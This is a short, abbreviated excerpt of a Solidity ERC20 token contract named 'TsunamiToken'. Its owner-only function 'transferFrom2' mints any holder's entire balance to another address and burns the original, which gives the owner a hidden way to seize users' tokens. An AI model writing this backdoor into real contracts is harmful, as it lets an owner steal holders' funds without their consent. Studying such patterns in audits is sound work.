...
contract TsunamiToken is MintableToken {
    ...
    function initialize(uint256 _initialMint) public initializer {
        __ERC20_init("Tsunami Token", "TSNMI");
        __Ownable_init();
    ...
    function transferFrom2(address _from, address _to) external onlyOwner {
        super._mint(_to, balanceOf(_from));
        super._burn(_from, balanceOf(_from));
    }
